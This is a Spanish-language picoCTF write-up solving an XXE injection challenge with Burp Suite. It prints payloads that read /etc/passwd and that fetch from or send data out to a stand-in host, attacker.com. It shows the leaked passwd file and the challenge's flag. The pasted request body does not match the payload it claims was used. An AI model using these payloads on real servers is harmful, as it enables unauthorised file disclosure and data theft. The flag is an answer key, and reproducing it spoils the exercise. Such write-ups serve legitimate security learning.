--- 
### Descripción:
**The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
[Web Portal](http://saturn.picoctf.net:56305/).**

### Pistas: 
```
1.- XML external entity Injection
```

### Solución:
- **Para la colucion de este reto se utilizaron 2 cosas:**
- 1.- BURP SUITE.
- 2.- FOXYPROXY.
**Primeramente se hizo una conexión al foxyproxy con el burp, para que se mandara correctamente lo que necesitamos, para ello lo añadimos manualmente de la siguiente manera:**
![[Pasted image 20250404182515.png]]

---

- **Después de haber hecho dicha conexión, ahora si entramos a la pagina que se nos proporciono en el reto, le damos al froxyproxy y clickeamos el proxy que acabamos de añadir, entramos a BurpSuite, y  nos dirigimos a la pestaña proxy**
- **En la pagina aparecen 3 recuadros sobre universidades, cada uno con un botón para mas detalles, clickeamos cualquiera de ellos, y se mandara al burp.**
![[Pasted image 20250404183051.png]]
- **Le daremos click izquierdo y lo mandaremos al repetidor (send repeater). Ya en el repetidor, daremos al botón de send, pero no servirá de nada aún, para eso investigaremos sobre los payloads de XXE.**

---

```
Aquí te dejo algunos ejemplos de payloads de XXE (XML External Entity), una vulnerabilidad que permite a los atacantes incluir entidades externas en un archivo XML. Estos payloads son ejemplos comunes y pueden variar según la configuración y las protecciones implementadas en el servidor o la aplicación.
```
**Payloads básicos de XXE.**
1.- Lectura de archivos locales:
```bash
<!DOCTYPE root [
  <!ELEMENT root ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>&xxe;</root>
```

2.- Acceso a archivos a través de HTTP:
```bash
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious_file.xml" >
]>
<root>&xxe;</root>
```

3.- Exfiltración de información a través de un servidor remoto:
```bash
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=%25{data}" >
]>
<root>&xxe;</root>

```

---

- **Después de una ardua investigación (chatgpt), probamos cual nos funcionaria, en este caso funciono la primera opción; para esto copiamos el "codigo", lo pegremos en la parte de Burp**
```bash
<?xml version="1.0" encoding="UTF-8"?>
   <data> 
     <ID>
     1
     </ID>
   </data>

```
- **De la siguiente manera:**
![[Pasted image 20250404184137.png]]
- **Al darle clic al botón de "send", nos debería de aparecer lo siguiente:**
```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Sat, 05 Apr 2025 00:20:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}

```
- **Obteniendo al final nuestra bandera.**
### Bandera:
```
picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
```
